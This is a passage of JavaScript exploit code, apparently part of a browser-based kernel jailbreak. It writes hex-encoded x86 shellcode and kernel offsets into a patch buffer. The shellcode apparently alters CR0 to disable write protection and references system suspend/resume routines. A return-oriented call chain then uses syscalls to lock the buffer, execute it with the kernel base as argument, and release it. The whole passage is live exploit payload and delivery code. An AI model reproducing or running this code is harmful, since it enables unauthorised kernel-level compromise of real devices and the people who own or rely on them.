  patch_buffer_view[166] = 0x001f1e09;
  patch_buffer_view[167] = 0x9090d231;
  patch_buffer_view[168] = 0x1e3e87c7;
  patch_buffer_view[169] = 0xc931001f;
  patch_buffer_view[170] = 0x0d489090;
  patch_buffer_view[171] = 0x00010000;
  patch_buffer_view[172] = 0xffc0220f;
  patch_buffer_view[173] = 0x0000ef15;
  patch_buffer_view[174] = 0xc0200f00;
  patch_buffer_view[175] = 0xffff2548;
  patch_buffer_view[176] = 0x220ffffe;
  patch_buffer_view[177] = 0x3d8b48c0;
  patch_buffer_view[178] = 0x000000dc;
  patch_buffer_view[179] = 0xc03107c7;
  patch_buffer_view[180] = 0x0d4800c3;
  patch_buffer_view[181] = 0x00010000;
  patch_buffer_view[182] = 0x5dc0220f;
  patch_buffer_view[183] = 0x737973c3;
  patch_buffer_view[184] = 0x5f6d6574;
  patch_buffer_view[185] = 0x70737573;
  patch_buffer_view[186] = 0x5f646e65;
  patch_buffer_view[187] = 0x73616870;
  patch_buffer_view[188] = 0x705f3265;
  patch_buffer_view[189] = 0x735f6572;
  patch_buffer_view[190] = 0x00636e79;
  patch_buffer_view[191] = 0x74737973;
  patch_buffer_view[192] = 0x725f6d65;
  patch_buffer_view[193] = 0x6d757365;
  patch_buffer_view[194] = 0x68705f65;
  patch_buffer_view[195] = 0x32657361;
  patch_buffer_view[196] = 0x73797300;
  patch_buffer_view[197] = 0x5f6d6574;
  patch_buffer_view[198] = 0x75736572;
  patch_buffer_view[199] = 0x705f656d;
  patch_buffer_view[200] = 0x65736168;
  patch_buffer_view[201] = 0x90900033;
  patch_buffer_view[202] = 0x00000000;
  patch_buffer_view[203] = 0x00000000;
  patch_buffer_view[204] = 0x000f88f0;
  patch_buffer_view[205] = 0x00000000;
  patch_buffer_view[206] = 0x002ef170;
  patch_buffer_view[207] = 0x00000000;
  patch_buffer_view[208] = 0x00018df0;
  patch_buffer_view[209] = 0x00000000;
  patch_buffer_view[210] = 0x00018ef0;
  patch_buffer_view[211] = 0x00000000;
  patch_buffer_view[212] = 0x02654110;
  patch_buffer_view[213] = 0x00000000;
  patch_buffer_view[214] = 0x00097230;
  patch_buffer_view[215] = 0x00000000;
  patch_buffer_view[216] = 0x00402e60;
  patch_buffer_view[217] = 0x00000000;
  patch_buffer_view[218] = 0x01520108;
  patch_buffer_view[219] = 0x00000000;
  patch_buffer_view[220] = 0x01520100;
  patch_buffer_view[221] = 0x00000000;
  patch_buffer_view[222] = 0x00462d20;
  patch_buffer_view[223] = 0x00000000;
  patch_buffer_view[224] = 0x00462dfc;
  patch_buffer_view[225] = 0x00000000;
  patch_buffer_view[226] = 0x006259a0;
  patch_buffer_view[227] = 0x00000000;
  patch_buffer_view[228] = 0x006268d0;
  patch_buffer_view[229] = 0x00000000;
  patch_buffer_view[230] = 0x00625dc0;
  patch_buffer_view[231] = 0x00000000;
  patch_buffer_view[232] = 0x00626290;
  patch_buffer_view[233] = 0x00000000;
  patch_buffer_view[234] = 0x00626720;
  patch_buffer_view[235] = 0x00000000;
  //lock payload / call payload / release payload
  {
    chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
    chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
    chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
  }
  chain.run();
};
